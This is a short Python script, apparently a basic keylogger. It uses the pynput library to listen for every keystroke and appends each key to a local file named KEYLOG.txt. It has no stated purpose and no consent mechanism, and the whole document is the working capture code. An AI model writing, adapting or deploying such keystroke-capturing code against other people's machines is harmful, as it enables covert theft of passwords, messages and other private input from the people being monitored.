from pynput.keyboard import Key, Listener

def on_press(key):
        foo = str(key)
        f = open('KEYLOG.txt', 'r')
        text = f.read()
        f.close()
        newkey = foo.replace('\'', '')
        text = text + newkey
        f = open('KEYLOG.txt', 'w')
        f.write(text)
        f.close()

with Listener(on_press=on_press) as listener:
        listener.join()
        
